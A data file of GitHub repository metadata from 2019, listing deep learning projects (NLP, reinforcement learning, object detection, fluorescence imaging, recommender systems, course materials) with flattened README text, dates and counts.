wuuw,NLP-models,deep-learning#nlp,NLP models Introduction NLP push Content D 1 TextCNN TextCNN Convolutional Neural Networks for Sentence Classification TextCNN origin paper A Sensitivity Analysis of and Practitioners Guide to Convolutional Neural Networks for Sentence Classification TextCNN 2 TextCNN Highway TextCNNhighway Highway Networks Highway Networks origin paper Training Very Deep Networks Datasets datasets Positive Negative 2 0 1 30000 Pre trained Word Embedding 800 16GB 50 900 MB 90 https pan baidu com s 1TvTlHONTagk1nWKyV5SVJQ lj7c wordembeddings worddictionaries WeChat ID fivesheeps D Vocab 5 4 5 7 10 50 100 200 800 Full Size 9 MB 82 MB 127 MB 182 MB 909 MB 1 77 GB 3 55 GB 16 GB,2019-08-08T11:34:37Z,2019-08-10T09:39:03Z,Jupyter Notebook,wuuw,User,1,1,0,11,master,wuuw,1,0,0,0,0,0,0
AmrMKayid,KayQRL,quantum-computing#quantum-machine-learning#reinforcement-learning,KayQRL,2019-09-12T09:25:56Z,2019-09-12T17:25:09Z,Python,AmrMKayid,User,1,1,0,8,master,AmrMKayid,1,0,0,0,0,0,0
dev10110,deep_learnt_controls,n/a,deeplearntcontrols Implements ideas from Dario Izzo on deep learning control methods Specifically employs ideas from Real time optimal control via Deep Neural Networks study on landing problems https arxiv org pdf 1610 08668 pdf,2019-09-08T19:18:03Z,2019-10-22T13:45:38Z,Jupyter Notebook,dev10110,User,1,1,0,5,master,dev10110,1,0,0,0,0,0,0
MoweiWang,machine-learning-for-networking-paper-list,data-driven-networks#deep-learning#machine-learning#networking#reinforcement-learning#self-driving-networks,machine learning for networking paper list A list of recent papers applying machine learning especially deep learning and deep reinforcement learning in computer networking domain The papers are mostly selected from major venues such as Sigcomm NSDI Mobicom Mobisys IMC CoNEXT INFOCOM Hotnets MM MMSys OSDI SOSP etc Papers with interesting topics or insights are also listed here even if they are not published yet or just on the arXiv col 3 is some wordy text 1600 col 2 is centered 12 zebra stripes are neat 1 machine learning for networking paper list machine learning for networking paper list Papers papers Survey and overview survey and overview Application application Adaptive bitrate ABR algorithm in video streaming adaptive bitrate abr algorithm in video streaming Congestion control congestion control Routing traffic engineering and traffic optimization routing traffic engineering and traffic optimization QoE optimization qoe optimization Job scheduling job scheduling Multi path scheduling multi path scheduling Packet classification packet classification Topology adaptation in data center networks topology adaptation in data center networks Network modeling network modeling Measurement measurement configuration extrapolation configuration extrapolation Self driving Networks self driving networks Conceptual discussion and experimental study conceptual discussion and experimental study Interpretability interpretability Generalization generalization Robustness robustness Verification verification Others others Platform platform Experience experience Papers Survey and overview 1 Machine learning for networking Workflow advances and opportunities https ieeexplore ieee org abstract document 8121867 machine learning for networking IEEE Network 2017 Application Adaptive bitrate ABR algorithm in video streaming 1 Neural adaptive video streaming with pensieve https dl acm org authorize cfm key N33908 Pensieve SIGCOMM 17 slides https conferences sigcomm org sigcomm 2017 files program ts 5 2 pensieve pptx Pensieve slides code https github com hongzimao pensieve Pensieve code 2 CS2P 3 tianchi huang 4 SIGMM Congestion control 1 Tcp ex machina Computer generated congestion control https conferences sigcomm org sigcomm 2013 papers sigcomm p123 pdf Remy SIGCOMM 13 slides https conferences sigcomm org sigcomm 2013 slides sigcomm 12 pdf Remy slides code https github com tcpexmachina remy Remy code website http web mit edu remy Remy website 2 PCC Re architecting Congestion Control for Consistent High Performance https www usenix org system files conference nsdi15 nsdi15 paper dong pdf PCC NSDI 15 slides https www usenix org sites default files conference protected files nsdi15slidesdong pdf PCC slides code https github com PCCproject PCC code website https modong github io pcc page PCC website 3 PCC Vivace Online Learning Congestion Control https www usenix org system files conference nsdi18 nsdi18 dong pdf PCC Vivace NSDI 18 slides https www usenix org sites default files conference protected files nsdi18slidesdong pdf PCC Vivace slides code https github com PCCproject PCC Kernel PCC Vivace code 4 indigo 5 ICML 6 NIPS 7 Routing traffic engineering and traffic optimization 1 Learn to route hotnets 2 experience driven infocom 3 Auto sigcomm QoE optimization 1 Via 2 pytheas 3 CFA 4 Job scheduling 1 Decima 2 DeepRM Multi path scheduling 1 infocom 2 JSAC 3 JSAC Packet classification 1 NeuralCuts Topology adaptation in data center networks 1 xWeaver Network modeling 1 unveiling 2 deepQ sigcomm netai workshop Measurement 1 sketchlearn 2 conext gan configuration extrapolation 1 NSDI Self driving Networks Conceptual discussion and experimental study Interpretability 1 apnet 2 sigcomm neiai workshop Generalization Robustness Verification Others Platform 1 pantheons 2 Park Experience 1 ICML workshop pensieve in Facebook,2019-09-16T14:27:51Z,2019-09-18T03:41:03Z,n/a,MoweiWang,User,1,1,0,4,master,MoweiWang,1,0,0,0,0,0,0
irisliucy,iris_playbook,n/a,,2019-08-23T12:50:12Z,2019-09-05T03:14:42Z,n/a,irisliucy,User,1,1,0,21,master,irisliucy,1,0,0,1,0,2,0
ycv005,Weather_forecast,deep-learning#forecasting#lstm#lstm-neural-networks#ols#regularization#time-series-forecasting#weather,Weatherforecast The Project is done in 3 parts The Complexity performance of the model increases from starting to the end 1 In wone folder Applied Linear Regression with OLS for temperature prediction Dataset is already present inside folder 2 In wtwo folder Applied Linear Regression with Regularization Elastic Net for rainfall prediction Dataset is already present inside folder 3 In wthree folder Applied RNN LSTM for pressure windspeed temperature prediction Dataset is already present inside folder,2019-09-16T17:01:21Z,2019-12-03T14:19:28Z,Jupyter Notebook,ycv005,User,1,1,0,11,master,ycv005,1,0,0,0,0,0,0
AntonioShen,Antiburnt_deeplearning,n/a,Antiburntdeeplearning Use deep learning strategy to detect food burnt event in advance for more details please check AntiburntDLalgorithm docx in version2,2019-08-19T05:34:57Z,2019-08-28T05:41:15Z,Python,AntonioShen,User,1,1,0,4,master,AntonioShen,1,0,0,0,0,0,0
ummadiviany,MachineLearning,n/a,MachineLearning,2019-09-06T16:13:13Z,2019-09-27T15:36:49Z,Jupyter Notebook,ummadiviany,User,1,1,0,14,master,ummadiviany,1,0,0,0,0,0,1
saket-shetty,Human-Posture-Recognition,n/a,Human Posture Recognition Human Posture Recognition using deep learning Demo Link to my YouTube video https github com saket shetty Human Posture Recognition blob master Capture PNG https www youtube com watch v yok2L09Sq0 Prerequisites 1 Install Anaconda 2 Clone this repo and paste it in a folder called tenforflow1 and paste it in C directory 3 Clone labelImg repo https github com tzutalin labelImg and paste it in desktop 4 Goto modelsresearchobjectdetectionimages folder remove all the images from train and test folder along with xml file and delete both csv files Actual Work 1 Open Anaconda and create a conda conda create n tensorflow1 2 Then activate that conda activate tensorflow1 3 Install following pip tensorflow1 C pip install tensorflow tensorflow1 C conda install c anaconda protobuf tensorflow1 C pip install pillow tensorflow1 C pip install lxml tensorflow1 C pip install Cython tensorflow1 C pip install numpy 1 16 4 this specific version is required since updated version is giving some error tensorflow1 C pip install contextlib2 tensorflow1 C pip install jupyter tensorflow1 C pip install matplotlib tensorflow1 C pip install pandas tensorflow1 C pip install opencv python 4 0 Enter the follow steps all this steps should be done in tensorflow1 in anaconda virtual environment 4 1 Enter the following a set PYTHONPATH C tensorflow1modelsC tensorflow1modelsresearchC tensorflow1modelsresearchslim b set PATH PATH PYTHONPATH you have to do this steps evertime when you want to train new data 4 2 Change directory to C tensorflow1modelsresearch then paste following protoc pythonout objectdetectionprotosanchorgenerator proto objectdetectionprotosargmaxmatcher proto objectdetectionprotosbipartitematcher proto objectdetectionprotosboxcoder proto objectdetectionprotosboxpredictor proto objectdetectionprotoseval proto objectdetectionprotosfasterrcnn proto objectdetectionprotosfasterrcnnboxcoder proto objectdetectionprotosgridanchorgenerator proto objectdetectionprotoshyperparams proto objectdetectionprotosimageresizer proto objectdetectionprotosinputreader proto objectdetectionprotoslosses proto objectdetectionprotosmatcher proto objectdetectionprotosmeanstddevboxcoder proto objectdetectionprotosmodel proto objectdetectionprotosoptimizer proto objectdetectionprotospipeline proto objectdetectionprotospostprocessing proto objectdetectionprotospreprocessor proto objectdetectionprotosregionsimilaritycalculator proto objectdetectionprotossquareboxcoder proto objectdetectionprotosssd proto objectdetectionprotosssdanchorgenerator proto objectdetectionprotosstringintlabelmap proto objectdetectionprotostrain proto objectdetectionprotoskeypointboxcoder proto objectdetectionprotosmultiscaleanchorgenerator proto objectdetectionprotosgraphrewriter proto objectdetectionprotoscalibration proto objectdetectionprotosflexiblegridanchorgenerator proto 4 3 Then run the setup file tensorflow1 C tensorflow1modelsresearch python setup py build tensorflow1 C tensorflow1modelsresearch python setup py install To verify whether all the setup is done correctly run following command tensorflow1 C tensorflow1modelsresearchobjectdetection jupyter notebook objectdetectiontutorial ipynb It should open a new browser mainly Internet explorer it will take some time to run in step 4 and 5 it will take few minutes since it has to download few file Once all the steps are correctly done two picture will be shown one with dog and another with beaches and kites once this is done correctly we can move on to next steps Note If you run the full Jupyter Notebook without getting any errors but the labeled pictures still don t appear try this go in to objectdetection utils visualizationutils py and comment out the import statements around lines 29 and 30 that include matplotlib Then try re running the Jupyter notebook 5 Gather and Label Pictures Now we can do the actual training of the images 5 1 Download all the images with different angles to which you have to train the system and put it in train and test folder C tensorflow1modelsresearchobjectdetectionimages put 80 of the images in test folder and 20 in train folder 5 2 Label Image hope you have cloned the labelImg repo Open command Prompt and type following cd DesktoplabelImage python labelImg py It will open a software click on open directory and link to the test and training folder C tensorflow1modelsresearchobjectdetectionimagestrain or test It should show you train images select the object from the image after that a textfield will appear enter the name of the object do similar to the test images after that same amount of xml file would appear in the folder as the amount of the images present 5 3 change xml to CSV file Run following command for it tensorflow1 C tensorflow1modelsresearchobjectdetection python xmltocsv py It will create to csv file naming testlabel csv and trainlabel csv 5 4 Next open the generatetfrecord py file in a text editor Replace the label map starting at line 31 with your own label map where each object is assigned an ID number This same number assignment will be used when configuring the labelmap pbtxt For example say you are training a classifier to detect basketballs shirts and shoes You will replace the following code in generatetfrecord py TO DO replace this with label map def classtexttoint rowlabel if rowlabel standing return 1 elif rowlabel sitting return 2 elif rowlabel sleeping return 3 else None to your label which can be TO DO replace this with label map def classtexttoint rowlabel if rowlabel basketball return 1 elif rowlabel football return 2 elif rowlabel sleeping return 3 else None 5 5 Then generate the TFRecord files by issuing these commands from the objectdetection folder python generatetfrecord py csvinput imagestrainlabels csv imagedir imagestrain outputpath train record python generatetfrecord py csvinput imagestestlabels csv imagedir imagestest outputpath test record 6 0 Few steps before training The label map tells the trainer what each object is by defining a mapping of class names to class ID numbers Use a text editor to create a new file and save it as labelmap pbtxt in the C tensorflow1modelsresearchobjectdetectiontraining folder Make sure the file type is pbtxt not txt In the text editor copy or type in the label map in the format below the example below is the label map for my Pinochle Deck Card Detector item id 1 name standing item id 2 name sitting item id 3 name sleeping The label map ID numbers should be the same as what is defined in the generatetfrecord py file For the basketball shirt and shoe detector example mentioned in Step 4 the labelmap pbtxt file will look like item id 1 name basketball item id 2 name shirt item id 3 name shoe 6 1 Configure training Finally the object detection training pipeline must be configured It defines which model and what parameters will be used for training This is the last step before running training Navigate to C tensorflow1modelsresearchobjectdetectionsamplesconfigs and copy the fasterrcnninceptionv2pets config file into the objectdetectiontraining directory Then open the file with a text editor There are several changes to make to the config file mainly changing the number of classes and examples and adding the file paths to the training data Make the following changes to the fasterrcnninceptionv2pets config file Note The paths must be entered with single forward slashes NOT backslashes or TensorFlow will give a file path error when trying to train the model Also the paths must be in double quotation marks not single quotation marks Line 9 Change numclasses to the number of different objects you want the classifier to detect For the above basketball shirt and shoe detector it would be numclasses 3 Line 106 Change finetunecheckpoint to finetunecheckpoint C tensorflow1 models research objectdetection fasterrcnninceptionv2coco20180128 model ckpt Lines 123 and 125 In the traininputreader section change inputpath and labelmappath to inputpath C tensorflow1 models research objectdetection train record labelmappath C tensorflow1 models research objectdetection training labelmap pbtxt Line 130 Change numexamples to the number of images you have in the imagestest directory Lines 135 and 137 In the evalinputreader section change inputpath and labelmappath to inputpath C tensorflow1 models research objectdetection test record labelmappath C tensorflow1 models research objectdetection training labelmap pbtxt Save the file after the changes have been made Thats it The training job is all configured and ready to go 6 2 Run the Training From the objectdetection directory run the following command to begin training python train py logtostderr traindir training pipelineconfigpath training fasterrcnninceptionv2pets config TensorFlow will initialize the training The initialization can take up to 30 seconds before the actual training begins let it train for 3 hours minimum or if the loss is plateau or if the loss is constant at 0 05 6 3 If the training if done for 3 Hours then press ctrl c to stop the training 7 0 Export Inference Graph Now that training is complete the last step is to generate the frozen inference graph pb file From the objectdetection folder issue the following command where XXXX in model ckpt XXXX should be replaced with the highest numbered ckpt file in the training folder python exportinferencegraph py inputtype imagetensor pipelineconfigpath training fasterrcnninceptionv2pets config trainedcheckpointprefix training model ckpt XXXX outputdirectory inferencegraph 8 Use Your Newly Trained Object Detection Classifier The object detection classifier is all ready to go Ive written Python scripts to test it out on an image Before running the Python scripts you need to modify the NUMCLASSES variable in the script to equal the number of classes you want to detect For my Human Posture Detector there are 3 position I want to detect so NUMCLASSES 3 so open Objectdetectionimage py in an editor and change the NUMCLASS To run any of the scripts type idle in the Anaconda Command Prompt with the tensorflow1 virtual environment activated and press ENTER This will open IDLE and from there you can open any of the scripts and run them If everything is working properly the object detector will initialize for about 10 seconds and then display a window showing any objects its detected in the image Built With Python Tensorflow labelImg Authors Saket Shetty Initial work saket shetty https github com saket shetty Varun Shetty Initial work varun shetty https github com varunshetty1 Faisal Shaikh Contact email shettysaket05 gmail com,2019-09-13T14:28:11Z,2019-10-31T07:48:03Z,Python,saket-shetty,User,0,1,0,16,master,saket-shetty,1,0,0,0,0,0,0
KrishnaKumarTiwari,interesting-papers,n/a,Interesting Papers ML AI Deep Learning Computer Science Papers Idea is to keep interesting papers and their summaries text video links under a central repo Repo is sub structured by domain area Inspired by https paperswelove org,2019-08-22T18:50:14Z,2019-10-09T13:48:41Z,PostScript,KrishnaKumarTiwari,User,1,1,0,10,master,KrishnaKumarTiwari,1,0,0,0,0,0,0
dooyounggo,MyConvNet,n/a,MyConvNet Deep learning using TensorFlow low level APIs Build your own convolutional neural networks using TensorFlow Supports image classification and semantic segmentation tasks The code was verified using PyCharm on Windows How To Run Download all the files Prepare your data using scripts in subsets Build your own networks by modifying scripts in models Edit parameters py to change the dataset model directories etc Run train py to train the model Run test py to test the trained model Instruction Download the basic instruction https www dropbox com s 64wtb6kvn9ms5o3 MyConvNet pptx dl 0 Packages Python 3 7 tensorflow gpu 1 14 0 numpy 1 16 4 matplotlib 3 1 0 scikit image 0 15 0 scikit learn 0 21 2 opencv python 4 1 0 25 TODO Speedup Training is slower than tfcnnbenchmark Include detection task,2019-09-10T00:55:14Z,2019-12-13T08:04:10Z,Python,dooyounggo,User,1,1,0,690,master,dooyounggo,1,0,0,0,0,0,1
AshishBarvaliya,Image-Clssification-Resnet,n/a,Image Clssification Resnet 1 datapreparation ipynb In this file all images of train test and pred sets convert in to binary arrays for that you need to download the dataset https www kaggle com puneet6060 intel image classification 2 modeling ipynb Here i am using resnet for classification i trained model three time normal resnet got test accuracy 75 resnet with 0 5 dropout got test accu 85 resnet with 0 7 dropout got test accu 78 Note in the file only last model is available,2019-08-23T16:33:35Z,2019-08-23T18:16:39Z,Jupyter Notebook,AshishBarvaliya,User,1,1,0,10,master,AshishBarvaliya,1,0,0,0,0,0,0
YafeiWu,xdl_tdm,n/a,,2019-08-27T10:51:31Z,2019-09-12T14:52:52Z,Python,YafeiWu,User,1,1,1,1,master,YafeiWu,1,0,0,0,0,0,0
jasontsmith2718,DL4FLI,n/a,DL4FLI Deep Learning for Fluorescence Lifetime Imaging FLI This GitHub contains relevant script data and instructions for 1 FLI data simulation workflow MATLAB FLIM TPSFsimulationFLIM https github com jasontsmith2718 DL4FLI tree master TPSFsimulationFLIM Basic MFLI TPSFsimulationbasic https github com jasontsmith2718 DL4FLI tree master TPSFsimulationbasic Monte Carlo via MCX http mcx space modeling of fluorescence decays through turbid media https github com jasontsmith2718 DL4FLI tree master TPSFsimulationMCX THIS WORK IS ONGOING 2 FLI Net neural network training python Tensorflow Keras 3D CNN for MFLI and FLIM analysis FLINETex https github com jasontsmith2718 DL4FLI tree master FLINETex 3 SPCImage export and analysis instructions https github com jasontsmith2718 DL4FLI blob master SPCImageExportAndAnalyze SPCImageExportAndAnalyzeslideShow pptm raw true general along with example data SPCImageExportAndAnalyze https github com jasontsmith2718 DL4FLI tree master SPCImageExportAndAnalyze Authors Jason T Smith https www researchgate net profile JasonSmith96 Dr Ruoyang Yao https www researchgate net profile RuoyangYao Nathan Un https www linkedin com in nathanjohnun Dr Pingkun Yan https www researchgate net profile PingkunYan Research Group Functional Molecular Optical Imaging Laboratory http intes lab bme rpi edu RPI Relevant Data files MFLI Data 1 Time series MFLI for pharmacokinetic monitoring in vivo control https figshare com s f216de0f63a352cd5c44 FRET induced https figshare com s db8dbc19455ea5fa82f3 2 NIR FRET well plate AF700 AF750 https figshare com s 841b13c73a1a35cc4e63 3 In vivo matrigel ROIs https figshare com s d3f1375e2fd6d10bc30f for NIR FRET quantification AF700 AF750 4 MFLI acquisitions of well plates containing serial dilutions of ATTO 740 HITCI https figshare com s af59c3fe4fc8479efffa methodology detailed here REFERENCE 5 Serial dilution of AF750 https figshare com s 3ca9941b2c6e50f500eb imaged at 25mW 75mW laser power for performance assessment at low photon counts Visible FLIM Data 1 Visible FRET FLIM https figshare com s 541c3112813cbd417957 AF488 AF555 T47D breast cancer cells 2 Visible Metabolic NAD P H FLIM https figshare com s 0a78e95f917b142e53fc pre post exposure to sodium cyanide The breast cancer cell lines used include the following MCF10a AU565 T47D MDA MB 231 NIR FLIM Data 1 NIR FRET FLIM https figshare com s d4d21918f719a8233f4a AF700 AF750 T47D breast cancer cells In Silico Data 1 Data simulated across three photon count thresholds 25 100 100 250 250 500 https figshare com s e84c4d612654df989208 Related Publications Presentations PNAS Manuscript https www pnas org content early 2019 11 11 1912707116 Supplementary Information https www pnas org content pnas suppl 2019 11 11 1912707116 DCSupplemental pnas 1912707116 sapp pdf 1 Smith JT Yao R Sinsuebphon N Rudkouskaya A Un N Mazurkiewicz J Barroso M Yan P Intes X Fast fit free analysis of fluorescence lifetime imaging via deep learning Proceedings of the National Academy of Sciences 2019 Nov 12 Original preprint https www biorxiv org content 10 1101 523928v1 2 Smith JT Yao R Sinsuebphon N Rudkouskaya A Mazurkiewicz J Barroso M Yan P Intes X Ultra fast fit free analysis of complex fluorescence lifetime imaging via deep learning bioRxiv 2019 Jan 1 523928 OSA Proceeding https www osapublishing org abstract cfm uri NTM 2019 NM3C 4 3 Smith JT Un N Yao R Sinsuebphon N Rudkouskaya A Mazurkiewicz J Barroso M Yan P Intes X Fluorescent Lifetime Imaging improved via Deep Learning InNovel Techniques in Microscopy 2019 Apr 14 pp NM3C 4 Optical Society of America SPIE Presentation https www spiedigitallibrary org conference proceedings of spie 10871 108710J Deep learning for quantitative bi exponential fluorescence lifetime imaging Conference 10 1117 12 2509857 short 4 Smith JT Yao R Chen SJ Sinsuebphon N Rudkouskaya A Barroso M Yan P Intes X Deep learning for quantitative bi exponential fluorescence lifetime imaging Conference Presentation InMultimodal Biomedical Imaging XIV 2019 Mar 4 Vol 10871 p 108710J International Society for Optics and Photonics,2019-08-23T16:28:49Z,2019-11-19T17:45:28Z,MATLAB,jasontsmith2718,User,1,1,0,86,master,jasontsmith2718#yanrpi,2,0,0,0,0,0,0
EliorBenYosef,reinforcement-learning,actor-critic#ddpg#deep-deterministic-policy-gradient#deep-q-learning#deep-reinforcement-learning#double-q-learning#dql#expected-sarsa#keras#monte-carlo#open-ai-gym#pg#policy-gradient#q-learning#reinforcement-learning#sarsa#tabular-methods#td-0#tensorflow#torch,RL and Deep RL implementations This is a modular implementation meaning you can plug and play almost any environment in the corresponding file within the same base folder with any algorithm Table of contents Tabular Methods https github com EliorBenYosef reinforcement learning tabular methods How to use https github com EliorBenYosef reinforcement learning how to use Implemented Algorithms https github com EliorBenYosef reinforcement learning implemented algorithms rltabularpy Implemented Environments https github com EliorBenYosef reinforcement learning implemented environments envsdsspy Algorithms Performance Examples https github com EliorBenYosef reinforcement learning algorithms performance examples Deep Reinforcement Learning https github com EliorBenYosef reinforcement learning deep reinforcement learning How to use https github com EliorBenYosef reinforcement learning how to use 1 Implemented Algorithms https github com EliorBenYosef reinforcement learning implemented algorithms Implemented Environments https github com EliorBenYosef reinforcement learning implemented environments envspy Algorithms Performance Examples https github com EliorBenYosef reinforcement learning algorithms performance examples 1 Dependencies https github com EliorBenYosef reinforcement learning dependencies Tabular Methods How to use Simply run the testing file rltabulartesting py master tabularmethods rltabulartesting py There are 3 main operations leave the one you need comment out the rest policyevaluationalgorithmstest performs either Monte Carlo or TD 0 policy evaluation learningalgorithmstest performs each algorithm separately for multiple environments environmentstest performs a comparative algorithms test for each environment Training Test results come in the forms of graphs and statistics for some of the environments of both running average of episode scores and accumulated scores Implemented Algorithms rltabular py master tabularmethods rltabular py Monte Carlo MC policy evaluation MC non exploring starts control off policy MC control TD 0 policy evaluation under the GeneralModel class SARSA Expected SARSA Q learning Double Q learning Implemented Environments envsdss py master tabularmethods envsdss py environments with DiscreteDiscretized State Space Toy Text FrozenLake Taxi Blackjack Classic Control MountainCar CartPole Acrobot Algorithms Performance Examples AI agent before and after training Mountain Car Cart Pole Acrobot environmentstest result graphs Deep Reinforcement Learning How to use Simply run the desired algorithm file to perform it on the desired environment deepqlearning py master deepreinforcementlearning algorithms deepqlearning py play example environments CartPole 0 Breakout 1 SpaceInvaders 2 policygradient py master deepreinforcementlearning algorithms policygradient py play example environments CartPole 0 Breakout 1 SpaceInvaders 2 for the Monte Carlo PG REINFORCE algorithm set epbatchnum 1 actorcritic py master deepreinforcementlearning algorithms actorcritic py play example environments CartPole 0 Pendulum 1 MountainCarContinuous 2 deepdeterministicpolicygradient py master deepreinforcementlearning algorithms deepdeterministicpolicygradient py play example environments Pendulum 0 MountainCarContinuous 1 Most of the cases you can select the desired library type libtype implementation LIBRARYTF LIBRARYTORCH LIBRARYKERAS To play from the command line run cmdlineplay py master deepreinforcementlearning cmdlineplay py This performs the algorithm on a single environment through the command line using the argparse module to parse command line options The major benefit from this is that it enables concatenating multiple independent runs via so you can run multiple tests in one go To perform grid search run gridsearch py master deepreinforcementlearning gridsearch py This performs a comparative grid search for a single environment and plots the results This is mostly done for hyper parameters tuning Note that currently I added 16 colors more than that will raise an error so add more colors if you need more than 16 combinations Note that currently both grid search and cmdline play are tuned to DQL but it s applicable to every algorithm with only minor changes 1 comment out all unnecessary algorithms Agent train modules 2 make sure Agent class gets all needed unique arguments DQL doubledql tau PG epbatchnum AC DDPG beta 3 for cmdlineplay py adjust plotrunningaverage args memory eps beta Implemented Algorithms Deep Q learning master deepreinforcementlearning algorithms deepqlearning py DQL Policy Gradient master deepreinforcementlearning algorithms policygradient py PG Actor Critic master deepreinforcementlearning algorithms actorcritic py AC Deep Deterministic Policy Gradient master deepreinforcementlearning algorithms deepdeterministicpolicygradient py DDPG Note that some some algorithms have restrictions Innate restrictions Discrete Action Space Continuous Action Space Deep Q learning Policy Gradient Deep Deterministic Policy Gradient or because I haven t completed the code meaning writing for every library implementation tensorflow torch keras or for every input type observation vector stacked frames Implemented Environments envs py master deepreinforcementlearning envs py environments with Continuous State Space Discrete Action Space Continuous Action Space Observation Vector Input Type CartPole LunarLander Pendulum MountainCarContinuous LunarLanderContinuous BipedalWalker Stacked Frames Input Type Breakout SpaceInvaders Algorithms Performance Examples Grid Search master deepreinforcementlearning gridsearch py Performance of DQL Grid Search on first second FC layers sizes number of nodes neurons Dependencies Python 3 7 1 OpenAI Gym 0 12 1 Tensorflow 1 13 1 Tensorflow Probability 0 7 PyTorch 1 1 1 Keras 1 0 8 Numpy Matplotlib,2019-08-26T15:38:03Z,2019-10-31T11:22:24Z,Python,EliorBenYosef,User,1,1,0,93,master,EliorBenYosef,1,0,0,0,0,0,0
ivan-bulka,neural_networks,n/a,,2019-08-17T14:35:20Z,2019-08-18T11:01:51Z,Jupyter Notebook,ivan-bulka,User,1,1,0,1,master,ivan-bulka,1,0,0,0,0,0,0
mohaned-abid,ENSI-A.I-hackathon-2019-,n/a,ENSI A I hackathon 2019 classifying coin images using deep learning convnets,2019-08-18T22:26:01Z,2019-08-19T15:53:42Z,Python,mohaned-abid,User,1,1,0,4,master,mohaned-abid,1,0,0,0,0,0,0
vrkh1996,face-recognition,n/a,face recognition Face Recognition Based on Deep Learning,2019-08-26T21:05:11Z,2019-08-27T07:25:25Z,Python,vrkh1996,User,0,1,0,4,master,vrkh1996,1,0,0,0,0,0,0
COMSM0018-Applied-Deep-Learning,labsheets,applied-deep-learning#course#deep-learning#dl#labsheets#pytorch#teaching#university-of-bristol,PyTorch Labsheets Labsheets for the Applied Deep Learning course Overview Labsheet Description 0 lab 0 python intro 0 contents ipynb Introduction to Python and the scientific Python ecosystem lab 0 python intro 0 contents ipynb 1 lab 1 dnns lab 1 dnns ipynb Your First Fully Connected Network lab 1 dnns lab 1 dnns ipynb 2 lab 2 cnns lab 2 cnns ipynb BC4 and Your First CNN lab 2 cnns lab 2 cnns ipynb 3 lab 3 training lab 3 training ipynb Techniques for Training DNNs lab 3 training lab 3 training ipynb 4 lab 4 augment lab 4 data augmentation ipynb Data Augmentation lab 4 augment lab 4 data augmentation ipynb If you have trouble viewing the labsheets on github you can try using the NBViewer https nbviewer jupyter org github COMSM0018 Applied Deep Learning labsheets tree master service provided by ipython org Environments In these labs we ll be using two computing environments Colaboratory https colab research google com a hosted version of Jupyter notebooks for exploring PyTorch and dabbling with simple and non computationally expensive experiments Blue Crystal 4 https www acrc bris ac uk acrc phase4 htm docs https www acrc bris ac uk protected bc4 docs for GPU accelerated experiments If instead you d like to install Jupyter locally on your laptop we provide some guidance on a best efforts basis misc local environment setup ipynb If you have trouble setting things up then we d recommend using Colaboratory instead Problems Kindly file an issue https github com COMSM0018 Applied Deep Learning labsheets issues with a description of the problem you re facing your setup what you are observing and what you expect to happen instead,2019-09-18T13:03:11Z,2019-11-13T15:23:05Z,Jupyter Notebook,COMSM0018-Applied-Deep-Learning,Organization,8,1,1,15,master,willprice,1,0,0,0,1,0,0
svolchkov,SnapshotSerengeti,n/a,1 The following packages and libraries have been used to create and run the Jupyter notebook Anaconda 6 2 0 for Python 3 This includes IPython and numpy 1 14 3 After installing Anaconda it should be easy to run conda install to install the following OpenCV 3 4 1 tensorflow 1 12 0 keras 2 2 4 Most likely it will work with the latest versions of the above libraries 2 The archive will need to be unpacked to the root folder for IPython notebooks such as C Users on a Windows machine The contents of the archive include the notebook the h5 file with the model and the weights and an images subfolder which also contains a data csv file with the labels 3 Open the notebook and select Cell Run All Cells from the menu at the top 4 The output of the last cell should include several test images with predictions and ground truths,2019-09-18T02:29:30Z,2019-10-25T19:20:53Z,Jupyter Notebook,svolchkov,User,1,1,0,1,master,svolchkov,1,0,0,0,0,0,0
kevinling0218,CS6101_DUL,n/a,CS6101DUL NUS course CS6101 Deep Unsupervised Learning,2019-09-17T11:30:33Z,2019-10-12T06:10:44Z,n/a,kevinling0218,User,1,1,1,1,master,kevinling0218,1,0,0,0,0,0,0
jpmaldonado,np-dl-telco,n/a,Day 1 Data manipulation with Pandas reading and cleaning data from different sources Creating visualizations with matplotlib and seaborn Day 2 Introduction to Machine Learning with scikit learn Model development testing and debugging Model deployment in production Day 3 Neural networks and deep learning High level Keras API Convolutional neural networks for image processing Recurrent neural networks for sequence analysis Day 4 Anomaly outlier detection Autoencoders Case studies for network optimization,2019-09-11T11:03:18Z,2019-09-26T14:23:33Z,Jupyter Notebook,jpmaldonado,User,1,1,0,10,master,jpmaldonado,1,0,0,0,0,0,0
ankanbhunia,MetaCrowdTune,n/a,Finetuing of Scene Adaptive Crowd Counting Models Using Meta learning and Network Policy Estimation I worked on one shot scene specific crowd counting that learns to adapt already trained model to a specific test scene based on a single example During finetuning different layers are freezed based on the decision of a Policy network Alt text Diagram png Proposed Framework Atfirst I pre trained a regressor model on the UCF QNRF Dataset It is our main crowd counting network The main crowd counting network consists of a Resnet50 architecture A Policy network is defined that determines which layers of the Resnet50 should be finetuned on the new scene environment whereas frizzing the other layers Meta Learning technique has been employed for training the model The experiments are done on WorldExpo dataset It has 107 separate sets of scenes each with few images of crowd samples First 100 scenes are used to train the meta model and rest are used to test it,2019-09-01T15:42:49Z,2019-09-01T17:06:41Z,Python,ankanbhunia,User,1,1,0,10,master,ankanbhunia,1,0,0,0,0,0,0
yoongi0428,RecSys_PyTorch,pytorch#pytorch-implementations#recommender-system#recsys,Recommender System in PyTorch Implementations of deep learning based top N recommender systems in PyTorch pytorch org for practice Movielens https grouplens org datasets movielens 100k 1M are used as datasets List of Models DAE BPRMF To be implented GMF MLP NeuMF CML NGCF And more How to run 1 Choose RecSys model and edit configurations in main py 2 Edit configurations of the model you choose in conf 3 run main py Implement your own model You can add your own model into the framework if 1 Your model inherits BaseModel class in models BaseModel py 2 Implement necessary methods and add additional methods if you want 3 Make YourModel conf file in conf 4 Add your model in utils ModelBuilder py References Update history 2019 08 10 First Commit Base structure codes with Readme,2019-08-10T12:52:44Z,2019-08-20T08:07:59Z,Python,yoongi0428,User,1,1,0,3,master,yoongi0428,1,0,0,0,0,0,0
Magicboomliu,2019_Summer_Keras_Liuzihua,n/a,2019SummerKerasLiuzihua Using Keras in Deeplearningtask under the guide of the Python Deep learning,2019-08-10T10:19:21Z,2019-08-10T14:38:28Z,n/a,Magicboomliu,User,1,1,0,9,master,Magicboomliu,1,0,0,0,0,0,0
